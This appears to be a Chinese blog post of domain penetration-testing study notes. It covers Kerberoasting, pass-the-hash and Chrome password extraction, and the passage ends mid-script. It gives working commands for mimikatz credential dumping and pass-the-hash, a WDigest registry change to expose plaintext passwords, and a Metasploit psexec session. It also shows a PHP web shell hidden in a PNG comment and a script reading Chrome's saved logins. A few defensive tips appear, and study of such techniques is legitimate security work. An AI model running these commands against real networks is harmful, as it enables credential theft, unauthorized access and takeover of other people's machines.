<img src="https://img-blog.csdnimg.cn/20200929225012368.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>SPN扫描工具</strong></p>
<p><strong>GetUserSPNS</strong><br>
<img src="https://img-blog.csdnimg.cn/20200929225032957.png#pic_center" alt="在这里插入图片描述"><br>
Find-PSServiceAccounts<br>
<img src="https://img-blog.csdnimg.cn/20200929225041605.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
Get-SPN2<br>
<img src="https://img-blog.csdnimg.cn/20200929225106289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
GetUserSPNs.py</p>
<p>支持非域内机器扫描查找</p>
<p><strong>Kerberoasting</strong></p>
<p>知道相关服务的SPN后，可以用SPN申请一张票据 ST，如果Kerberos 协议设置票据为 RC4加密，则可通过爆破的方式得到服务对应用户的密码。<br>
<img src="https://img-blog.csdnimg.cn/2020092922513987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
首先，申请票据，在powershell上。</p>
<pre><code class="prism language-c">Add<span class="token operator">-</span>Type <span class="token operator">-</span>AssemblyName System<span class="token punctuation">.</span>IdentityModelNew<span class="token operator">-</span>Object System<span class="token punctuation">.</span>IdentityModel<span class="token punctuation">.</span>Tokens<span class="token punctuation">.</span>KerberosRequestorSecurityToken <span class="token operator">-</span>ArgumentList <span class="token string">"MSSQLSvc/mssql.cate4cafe.com:1433"</span>
</code></pre>
<p>使用klist查看票据申请是否成功。接着可使用mimikatz导出票据，再通过hashcat爆破即可。或者使用。</p>
<p>Invoke-Kerberoast.ps1导出转换成 John the Ripper 或者 HashCat 能够直接爆破的字符串。</p>
<p>在我们取得了 SPN 的修改权限后，可以为指定的域用户添加一个 SPN，这样可以随时获得该域用户的 TGS ，经过破解后获得明文口令，可以作为一个后门使用</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>sec<span class="token punctuation">.</span>thief<span class="token punctuation">.</span>one<span class="token operator">/</span>article_content<span class="token operator">?</span>a_id<span class="token operator">=</span><span class="token number">594539e5</span>b195b5fc38051bf7fb438524   <span class="token operator">--</span>详细文章
</code></pre>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>rcoil<span class="token punctuation">.</span>me<span class="token operator">/</span><span class="token number">2019</span><span class="token operator">/</span><span class="token number">06</span><span class="token operator">/</span>【域渗透】SPN<span class="token operator">%</span><span class="token number">20</span>扫描利用<span class="token operator">/</span>

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>freebuf<span class="token punctuation">.</span>com<span class="token operator">/</span>articles<span class="token operator">/</span>system<span class="token operator">/</span><span class="token number">174229.</span>html   <span class="token operator">--</span>老文章  SPN服务主体名称发现详解
</code></pre>
<p>想要继续了解的可以查看这两篇文章，巩固下</p>
<hr>
<h2><a id="516__8154"></a>5.1.6 哈希传递攻击利用</h2>
<p><strong>1、哈希传递攻击概念</strong></p>
<p>有一点内网渗透经验的都应该听说过哈希传递攻击，通过找到相应账户相关的密码散列值(LM Hash,NTLM Hash)来进行未授权登陆。</p>
<p>可参考Wikipedia的介绍，地址如下：<code>https://en.wikipedia.org/wiki/Pass_the_hash</code><br>
在域环境中，用户登录计算机时使用的大都是域账号，大量计算机在安装时会使用相同的本地管理员账号和密码，因此，如果计算机的本地管理员账号和密码也是相同的，攻击者就能使用哈希传递攻击的方法登陆内网中的其他计算机。</p>
<p>在Windows系统中，通常会使用NTLM身份认证，NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser)<br>
从Windows Vista和Windows Server 2008开始，微软默认禁用LM hash.在Windows Server 2012 R2及之后版本的操作系统中，默认不会在内存中保存明文密码，Mimikatz 就读不到密码明文。此时可以通过修改注册表的方式抓取明文，但需要用户重新登录后才能成功抓取。修改注册表命令为：</p>
<pre><code class="prism language-c">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest <span class="token operator">/</span>v UseLogonCredential <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d <span class="token number">1</span> <span class="token operator">/</span>f
</code></pre>
<p>因此，攻击者如果使用工具将散列值传递到其他计算机中，进行权限验证，就能够在身份验证的时候模拟该用户(即跳过调用API生成hash的过程)，实现对计算机的控制</p>
<p><strong>#NTLM Hash与NTLM</strong></p>
<p>hash分为LM hash和NT hash，如果密码长度大于15，那么无法生成LM hash。<br>
在Windows中，密码Hash目前称之为NTLM Hash，其中NTLM全称是：“NT LAN Manager”。这个NTLM是一种网络认证协议，与NTLM Hash的关系就是：NTLM网络认证协议是以NTLM Hash作为根本凭证进行认证的协议。也就是说，NTLM与NTLM Hash相互对应。在本地认证的过程中，其实就是将用户输入的密码转换为NTLM Hash与SAM中的NTLM Hash进行比较</p>
<p>注：</p>
<p>mimikatz支持导出内存中用户的LM hash，但前提是Windows系统支持LM hash<br>
Windows Server 2008启用LM hash的方法：<br>
gpedit.msc-&gt;计算机配置-&gt;Windows 设置-&gt;安全设置-&gt;本地策略-&gt;安全选项<br>
找到网络安全︰ 不要在下次更改密码存储 LAN 管理器的哈希值，选择已禁用<br>
系统下一次更改密码后，就能够导出LM hash（已经被弃用了）</p>
<p><img src="https://img-blog.csdnimg.cn/20200930084942419.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>2、利用方法</strong></p>
<p>首先就是神器mimikatz，但你首先得拥有本地管理员的执行的权限</p>
<pre><code class="prism language-c">privilege<span class="token punctuation">:</span><span class="token punctuation">:</span>debug
sekurlsa<span class="token punctuation">:</span><span class="token punctuation">:</span>logonpasswords
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200930085214490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
复制NTLM Hash的值</p>
<pre><code class="prism language-c">sekurlsa<span class="token punctuation">:</span><span class="token punctuation">:</span>pth <span class="token operator">/</span>user<span class="token punctuation">:</span>administrator <span class="token operator">/</span>domain<span class="token punctuation">:</span>XIAN<span class="token punctuation">.</span>COM <span class="token operator">/</span>ntlm<span class="token punctuation">:</span><span class="token number">7365e3</span>b22baeaebc0411873eedf84390
</code></pre>
<p>完成之后会弹出cmd.exe，或者重新开一个命令行<br>
<img src="https://img-blog.csdnimg.cn/20200930085239756.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
也可以尝试列出被哈希传递攻击的域内靶机的c盘内容<br>
<img src="https://img-blog.csdnimg.cn/20200930085259397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>#利用ms进行哈希传递攻击</strong></p>
<p><strong>msf内置的mimikatzi获取hash（需要管理员权限）</strong></p>
<p>在msf中也内置有mimikatz，以下命令都可以在msf中获取hash</p>
<pre><code class="prism language-c">hashdump
run hashdump
run post<span class="token operator">/</span>windows<span class="token operator">/</span>gather<span class="token operator">/</span>smart_hashdump
除了meterpreter自带的，还可以通过加载mimikatz获得：
load mimikatz（必须，否则无以下命令）
msv    获取的是hash值
tspkg   tspkg凭证相关的模块
wdigest   读取内存中存放的账号密码明文信息
kerberos  kerberos相关的模块
ssp   获取的是明文信息
</code></pre>
<p>mimikatz的原生命令在这里有些改动<br>
mimikatz_command 模块可以让我们使用mimikatz的全部功能</p>
<pre><code class="prism language-c">meterpreter <span class="token operator">&gt;</span> mimikatz_command <span class="token operator">-</span>f a<span class="token punctuation">:</span><span class="token punctuation">:</span>  输入一个错误的模块，可以列出所有模块
meterpreter <span class="token operator">&gt;</span> mimikatz_command <span class="token operator">-</span>f samdump<span class="token punctuation">:</span><span class="token punctuation">:</span>  可以列出samdump的子命令
meterpreter <span class="token operator">&gt;</span> mimikatz_command <span class="token operator">-</span>f samdump<span class="token punctuation">:</span><span class="token punctuation">:</span>hashes
meterpreter <span class="token operator">&gt;</span> mimikatz_command <span class="token operator">-</span>f handle<span class="token punctuation">:</span><span class="token punctuation">:</span>list  列出应用进程
meterpreter <span class="token operator">&gt;</span> mimikatz_command <span class="token operator">-</span>f service<span class="token punctuation">:</span><span class="token punctuation">:</span>list  列出服务
</code></pre>
<p>例如</p>
<pre><code class="prism language-c">mimikatz_command <span class="token operator">-</span>f samdump<span class="token punctuation">:</span><span class="token punctuation">:</span>hashes   获取hash
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200930085617726.png#pic_center" alt="在这里插入图片描述"><br>
建议每种都试一下，可能因为windows版本的高低，有些情况一种命令获取不到，比如我的win2003就只能用hashdump命令才能看到密码hash<br>
<img src="https://img-blog.csdnimg.cn/20200930085639604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/2020093008565147.png#pic_center" alt="在这里插入图片描述"><br>
<strong>#msf的kw模块(需要系统权限)</strong></p>
<p>kiwi就是msf内置的mimikatz模块的升级版<br>
但是kiwi是默认加载32位系统的，所以如果目标主机是64位系统的话，直接默认加载该模块会导致很多功能无法使用。所以如果目标系统是64位的，则必须先查看系统进程列表，然后用migrate命令将meterpreter进程迁移到一个64位程序的进程中，才能加载mimikatz并且查看系统明文。如果目标系统是32位的，则没有这个限制。<br>
使用前先在meterpreter下加载kiwi模块</p>
<p><img src="https://img-blog.csdnimg.cn/20200930085730493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
使用命令<code>creds_kerberos</code>列举所有kerberos凭据<br>
<img src="https://img-blog.csdnimg.cn/20200930085751233.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
可以看到我之前用msf内置的mimikatz没有加载出来的密码，现在明文加载出来了。<br>
再来将用户hash密码加载出来<code>kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令</code><br>
<img src="https://img-blog.csdnimg.cn/20200930085812404.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
可以看到成功列出用户密码hash<br>
kiwi模块命令集合</p>
<pre><code class="prism language-c">creds_all： 列举所有凭据
creds_kerberos：列举所有kerberos凭据
creds_msv：列举所有msv凭据
creds_ssp：列举所有ssp凭据
creds_tspkg：列举所有tspkg凭据
creds_wdigest：列举所有wdigest凭据
dcsync： 通过DCSync检索用户帐户信息
dcsync_ntlm： 通过DCSync检索用户帐户NTLM散列、SID和RID
golden_ticket_create：创建黄金票据
kerberos_ticket_list：列举kerberos票据
kerberos_ticket_purge：清除kerberos票据
kerberos_ticket_use：使用kerberos票据
kiwi_cmd：执行mimikatz的命令，后面接mimikatz<span class="token punctuation">.</span>exe的命令
lsa_dump_sam：dump出lsa的SAM
lsa_dump_secrets：dump出lsa的密文
password_change：修改密码
wifi_list： 列出当前用户的wifi配置文件
wifi_list_shared： 列出共享wifi配置文件<span class="token operator">/</span>编码
</code></pre>
<p><strong>msf psexec模块</strong><br>
PsExec是sysinternals套件中的一款强大的软件，通过他可以提权和执行远程命令，对于批量大范围的远程运维能起到很好的效果，尤其是在域环境下。但现在，攻击者渐渐开始使用psexec，通过命令行环境与目标靶机进行连接，甚至控制目标机器，而不需要通过远程连接协议（RDP）进行图形化设置，降低了因为恶意操作被管理员发现的可能性（因为PsExec是Windows提供的工具，所以杀毒软件可能会将其列入白名单）<br>
msf中有3个psexec模块都可以进行Hash传递利用：</p>
<pre><code class="prism language-c">#执行单个命令的PTH模块
auxiliary<span class="token operator">/</span>admin<span class="token operator">/</span>smb<span class="token operator">/</span>psexec_command

# 执行直接就获取到meterpreter的PTH模块
exploit<span class="token operator">/</span>windows<span class="token operator">/</span>smb<span class="token operator">/</span>psexec

# 支持对一个网段进行PTH进行验证的模块
exploit<span class="token operator">/</span>windows<span class="token operator">/</span>smb<span class="token operator">/</span>psexec_psh
</code></pre>
<p>再使用pesxec模块之前要保证：</p>
<p>开启445端口 SMB服务<br>
开启admin$共享<br>
使用之前板块获取到的管理员NTLM Hash<br>
<code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:7365e3b22baeaebc0411873eedf84390</code>这里前半部分的LM Hash不重要，只要保证后半部分的NTML Hash正确就行</p>
<pre><code class="prism language-c">msf5 <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> use exploit<span class="token operator">/</span>windows<span class="token operator">/</span>smb<span class="token operator">/</span>psexec
msf5 <span class="token function">exploit</span><span class="token punctuation">(</span>windows<span class="token operator">/</span>smb<span class="token operator">/</span>psexec<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set lhost <span class="token number">192.168</span><span class="token number">.5</span><span class="token number">.128</span>
lhost <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span><span class="token number">.5</span><span class="token number">.128</span>
msf5 <span class="token function">exploit</span><span class="token punctuation">(</span>windows<span class="token operator">/</span>smb<span class="token operator">/</span>psexec<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set rhost <span class="token number">192.168</span><span class="token number">.5</span><span class="token number">.11</span>
rhost <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span><span class="token number">.5</span><span class="token number">.11</span>
msf5 <span class="token function">exploit</span><span class="token punctuation">(</span>windows<span class="token operator">/</span>smb<span class="token operator">/</span>psexec<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set smbuser Administrator
smbuser <span class="token operator">=</span><span class="token operator">&gt;</span> Administrator
msf5 <span class="token function">exploit</span><span class="token punctuation">(</span>windows<span class="token operator">/</span>smb<span class="token operator">/</span>psexec<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set smbpass a780a2793038e0d41e929ffc01395127<span class="token punctuation">:</span><span class="token number">7365e3</span>b22baeaebc0411873eedf84390 
smbpass <span class="token operator">=</span><span class="token operator">&gt;</span> a780a2793038e0d41e929ffc01395127<span class="token punctuation">:</span><span class="token number">7365e3</span>b22baeaebc0411873eedf84390
msf5 <span class="token function">exploit</span><span class="token punctuation">(</span>windows<span class="token operator">/</span>smb<span class="token operator">/</span>psexec<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200930090006850.png#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20200930090013578.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
这里还有很多不错的获取hash方法没写（主要是懒，用msf方便），比如PowerShell、WCE、AES-256密钥哈希传递、python第三方库impacket下的secretsdump等等，以后有空再记录吧…</p>
<p><strong>3、防范措施</strong></p>
<p>KB2871997补丁的影响</p>
<p>防范首先想到打补丁，微软也早在2014年5月发布了KB2871997补丁，该补丁禁止通过本地管理员权限与远程计算机进行连接，其后果就是：无法通过本地管理员权限对远程计算机使用Psexec、WMI、smbecec等，也无法访问远程的文件共享等。<br>
但实际上就算打了KB2871997补丁后，Administrator账号(SID为500)也是例外的，使用该账户的NTLM Hash依然可以进行哈希传递</p>
<p>防御mimikatz攻击</p>
<p>mimikatz在抓取散列值或明文密码时，需要用到Debug权限（因为mimikatz需要和lsass进程进行交互，如果没有Debug权限，mimikatz将不能读取lsass进程里的密码）。而Debug权限归本地管理员Administrator所有,目的是确定哪些用户可以将调试器附加到任何进程或内核中，但一般Administrator不会用到这个权限(除非是系统进程)。</p>
<p><img src="https://img-blog.csdnimg.cn/20200930090156112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
所以在配置用户权限时，可以将拥有Debug权限的本地管理员从Administrator组中移除。重启系统之后，在运行mimikatz，在第一步"privilege::debug"时就会报错了</p>
<p>参考文献：</p>
<pre><code class="prism language-c">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>saucer<span class="token operator">-</span>man<span class="token punctuation">.</span>com<span class="token operator">/</span>information_security<span class="token operator">/</span><span class="token number">443.</span>html#cl<span class="token operator">-</span><span class="token number">11</span>
https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>saucer<span class="token operator">-</span>man<span class="token punctuation">.</span>com<span class="token operator">/</span>information_security<span class="token operator">/</span><span class="token number">79.</span>html#cl<span class="token operator">-</span><span class="token number">13</span>
https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>freebuf<span class="token punctuation">.</span>com<span class="token operator">/</span>articles<span class="token operator">/</span>system<span class="token operator">/</span><span class="token number">217681.</span>html
https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>blog<span class="token punctuation">.</span>csdn<span class="token punctuation">.</span>net<span class="token operator">/</span>qq_36119192<span class="token operator">/</span>article<span class="token operator">/</span>details<span class="token operator">/</span><span class="token number">104802921</span>
https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>cnblogs<span class="token punctuation">.</span>com<span class="token operator">/</span>Mikasa<span class="token operator">-</span>Ackerman<span class="token operator">/</span>p<span class="token operator">/</span>hou<span class="token operator">-</span>shen<span class="token operator">-</span>tou<span class="token operator">-</span>zhong<span class="token operator">-</span>de<span class="token operator">-</span>mi<span class="token operator">-</span>ma<span class="token operator">-</span>zhua<span class="token operator">-</span>qu<span class="token punctuation">.</span>html
</code></pre>
<hr>
<p>哈希传递-远程登录，这里书上还介绍了：<br>
<img src="https://img-blog.csdnimg.cn/20200930091058924.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
后期尝试下…</p>
<hr>
<h2><a id="52__8341"></a>5.2 用户习惯</h2>
<h2><a id="521__8342"></a>5.2.1 从目标文件中做信息搜集第一季</h2>
<p>个人实例：<br>
<img src="https://img-blog.csdnimg.cn/20200930092448265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
ExifTool可读写及处理图像、视频及音频，例如Exif、IPTC、XMP、JFIF、GeoTIFF、ICC Profile。包括许多相机的制造商信息读取，如佳能，卡西欧，大疆，FLIR，三星等<br>
<img src="https://img-blog.csdnimg.cn/20200930092541745.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">root@kali<span class="token punctuation">:</span><span class="token operator">/</span>home<span class="token operator">/</span>dayu<span class="token operator">/</span>桌面<span class="token operator">/</span>dayuMagic# exiftool <span class="token operator">-</span>lang zh<span class="token operator">-</span>cn <span class="token operator">-</span>a <span class="token operator">-</span>u <span class="token operator">-</span>g1 <span class="token punctuation">.</span><span class="token operator">/</span>sample<span class="token punctuation">.</span>php<span class="token punctuation">.</span>png 
<span class="token operator">--</span><span class="token operator">--</span> ExifTool <span class="token operator">--</span><span class="token operator">--</span>
ExifTool 版本                   <span class="token punctuation">:</span> <span class="token number">11.99</span>
<span class="token operator">--</span><span class="token operator">--</span> System <span class="token operator">--</span><span class="token operator">--</span>
文件名                          <span class="token punctuation">:</span> sample<span class="token punctuation">.</span>php<span class="token punctuation">.</span>png
文件存储位置                    <span class="token punctuation">:</span> <span class="token punctuation">.</span>
文件大小                        <span class="token punctuation">:</span> <span class="token number">2.2</span> kB
更新日期                        <span class="token punctuation">:</span> <span class="token number">2020</span><span class="token punctuation">:</span><span class="token number">08</span><span class="token punctuation">:</span><span class="token number">26</span> <span class="token number">08</span><span class="token punctuation">:</span><span class="token number">42</span><span class="token punctuation">:</span><span class="token number">26</span><span class="token operator">+</span><span class="token number">08</span><span class="token punctuation">:</span><span class="token number">00</span>
File Access Date<span class="token operator">/</span>Time           <span class="token punctuation">:</span> <span class="token number">2020</span><span class="token punctuation">:</span><span class="token number">08</span><span class="token punctuation">:</span><span class="token number">26</span> <span class="token number">08</span><span class="token punctuation">:</span><span class="token number">49</span><span class="token punctuation">:</span><span class="token number">11</span><span class="token operator">+</span><span class="token number">08</span><span class="token punctuation">:</span><span class="token number">00</span>
File Inode Change Date<span class="token operator">/</span>Time     <span class="token punctuation">:</span> <span class="token number">2020</span><span class="token punctuation">:</span><span class="token number">08</span><span class="token punctuation">:</span><span class="token number">26</span> <span class="token number">08</span><span class="token punctuation">:</span><span class="token number">48</span><span class="token punctuation">:</span><span class="token number">46</span><span class="token operator">+</span><span class="token number">08</span><span class="token punctuation">:</span><span class="token number">00</span>
File Permissions                <span class="token punctuation">:</span> rw<span class="token operator">-</span>r<span class="token operator">--</span>r<span class="token operator">--</span>
<span class="token operator">--</span><span class="token operator">--</span> File <span class="token operator">--</span><span class="token operator">--</span>
文件格式                        <span class="token punctuation">:</span> PNG
File Type Extension             <span class="token punctuation">:</span> png
MIME Type                       <span class="token punctuation">:</span> image<span class="token operator">/</span>png
<span class="token operator">--</span><span class="token operator">--</span> PNG <span class="token operator">--</span><span class="token operator">--</span>
像宽                            <span class="token punctuation">:</span> <span class="token number">200</span>
像高                            <span class="token punctuation">:</span> <span class="token number">150</span>
Bit Depth                       <span class="token punctuation">:</span> <span class="token number">8</span>
Color Type                      <span class="token punctuation">:</span> RGB
压缩方案                        <span class="token punctuation">:</span> Deflate<span class="token operator">/</span>Inflate
Filter                          <span class="token punctuation">:</span> Adaptive
Interlace                       <span class="token punctuation">:</span> Noninterlaced
文件改变的日期和时间            <span class="token punctuation">:</span> <span class="token number">2019</span><span class="token punctuation">:</span><span class="token number">09</span><span class="token punctuation">:</span><span class="token number">05</span> <span class="token number">13</span><span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">:</span><span class="token number">11</span>
注释                            <span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token operator">?</span>php <span class="token function">system</span><span class="token punctuation">(</span>$_REQUEST<span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">?</span><span class="token operator">&gt;</span>
<span class="token operator">--</span><span class="token operator">--</span> PNG<span class="token operator">-</span>pHYs <span class="token operator">--</span><span class="token operator">--</span>
Pixels Per Unit X               <span class="token punctuation">:</span> <span class="token number">2835</span>
Pixels Per Unit Y               <span class="token punctuation">:</span> <span class="token number">2835</span>
Pixel Units                     <span class="token punctuation">:</span> meters
<span class="token operator">--</span><span class="token operator">--</span> Composite <span class="token operator">--</span><span class="token operator">--</span>
图像尺寸                        <span class="token punctuation">:</span> <span class="token number">200</span>x150
Megapixels                      <span class="token punctuation">:</span> <span class="token number">0.030</span>
</code></pre>
<p>在大型内网渗透中，尤其是针对办公机的渗透，需要熟知目标集体或者个人的作息时间，工作时间，文档时间，咖啡时间，或者需要从某些文件中获取对方的真实拍摄地坐标等。那么无疑需要快速的从大量文件中筛选信息诉求。当目标越复杂，文件中的信息搜集就更为重要。如文档作者，技术文章作者，财务文档作者等，熟知在大量人员，获取对方职务，大大减少渗透过程中的无用性，重复性，可见性。与暴露性。而作为公司，应该熟悉相关文档的内置属性，尤其是在共享文件服务器上，删除或者复写敏感信息来降低企业安全风险。</p>
<p>本篇意旨企业安全在处理本公司相关敏感文件以及重要文件应做好更多的防范，尤其是重要部门，如研发，财务等。</p>
<hr>
<h2><a id="522__8387"></a>5.2.2 获取当前系统所有用户的谷歌浏览器密码</h2>
<p><strong>0x01. 知识简介</strong></p>
<p>1、DPAPI：</p>
<p>全称Data Protection Application Programming Interface</p>
<p>Windows系统的一个数据保护接口</p>
<p>主要用于保护加密的数据，常见的应用如：</p>
<pre><code class="prism language-c">Internet Explorer，Google Chrome中的密码和表单
存储无线连接密码
远程桌面连接密码
Outlook，Windows Mail，Windows Mail等中的电子邮件帐户密码
内部FTP管理员帐户密码
共享文件夹和资源访问密码
Windows Credential Manager
Skype
Windows CardSpace
Windows Vault
EFS文件加密
</code></pre>
<p>2.、DPAPI blob：</p>
<p>一段密文，可使用Master Key对其解密</p>
<p>3.、Master Key：</p>
<p>64字节，用于解密DPAPI blob，使用用户登录密码、SID和16字节随机数加密后保存在Master Key file中</p>
<p>4.、Master Key file：</p>
<p>a. 二进制文件，可使用用户登录密码对其解密，获得Master Key</p>
<p>b. 分为两种：</p>
<pre><code class="prism language-c">用户Master Key file，位于<span class="token operator">%</span>APPDATA<span class="token operator">%</span>\Microsoft\Protect\<span class="token operator">%</span>SID<span class="token operator">%</span>   存储用户的登陆密码
系统Master Key file，位于<span class="token operator">%</span>WINDIR<span class="token operator">%</span>\System32\Microsoft\Protect\S<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">5</span><span class="token operator">-</span><span class="token number">18</span>\User   存储wifi等各种密码
</code></pre>
<p>c. 固定位置：</p>
<p>%APPDATA%\Microsoft\Protect%SID%，该目录下往往有多个Master Key file，这是为了安全起见，系统每隔90天会自动生成一个新的Master Key(旧的不会删除)</p>
<p>5、 Preferred文件：<br>
位于Master Key file的同级目录，显示当前系统正在使用的MasterKey及其过期时间，默认90天有效期</p>
<p><strong>0x02 在线解密当前用户google浏览器下保存的密码</strong></p>
<pre><code class="prism language-c"># 在线获取当前用户google浏览器下保存的密码
import os<span class="token punctuation">,</span> sys
import shutil
import sqlite3
import win32crypt

db_file_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">'LOCALAPPDATA'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> r<span class="token string">'Google\Chrome\User Data\Default\Login Data'</span><span class="token punctuation">)</span>
<span class="token function">print</span><span class="token punctuation">(</span>db_file_path<span class="token punctuation">)</span>

<span class="token macro property"># tmp_file = os.path.join(os.path.dirname(sys.executable), 'tmp_tmp_tmp')</span>
tmp_file <span class="token operator">=</span> <span class="token string">'./loginData'</span>
<span class="token function">print</span><span class="token punctuation">(</span>tmp_file<span class="token punctuation">)</span>
<span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span>tmp_file<span class="token punctuation">)</span><span class="token punctuation">:</span>
    os<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>tmp_file<span class="token punctuation">)</span>
shutil<span class="token punctuation">.</span><span class="token function">copyfile</span><span class="token punctuation">(</span>db_file_path<span class="token punctuation">,</span> tmp_file<span class="token punctuation">)</span>

conn <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span>tmp_file<span class="token punctuation">)</span>
<span class="token keyword">for</span> row in conn<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token string">'select signon_realm,username_value,password_value from logins'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    try<span class="token punctuation">:</span>
